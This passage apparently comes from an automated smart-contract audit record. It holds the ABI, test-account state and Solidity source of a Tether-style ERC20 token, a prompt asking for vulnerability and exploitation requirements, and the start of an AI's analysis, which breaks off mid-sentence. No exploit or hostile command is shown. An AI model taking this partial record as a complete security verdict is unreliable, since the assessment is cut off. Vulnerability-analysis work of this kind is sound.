"uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xe982E462b094850F12AF94d21D470e21bE9D0E9C": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873535860000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. Contract Analysis:  \nThe analyzed contract is **TetherToken**, an ERC20 token implementation with additional features such as pausability, blacklisting, token upgradeability, and adjustable fees. It inherits from multiple contracts: `Pausable`, `StandardToken`, and `BlackList`. The contract holds token balances and can be used to transfer tokens, approve allowances, and manage token supply via issuing and redeeming tokens. It also supports pausing all token transfers and blacklisting addresses to restrict their token operations. The contract supports deprecation, forwarding calls to an upgraded contract address.\n\nKey features and business logic:  \n- Token transfers with optional fees (basis points and max fee).  \n- Pausable functionality controlled by the owner.  \n- Blacklist mechanism to block malicious users and destroy their tokens.  \n- Ability to issue and redeem tokens by the owner, affecting total supply.  \n- Upgradeability via deprecate function, forwarding calls to a new contract.  \n- Protection against ERC20 short address attack via `onlyPayloadSize` modifier.  \n- Fee parameters capped by 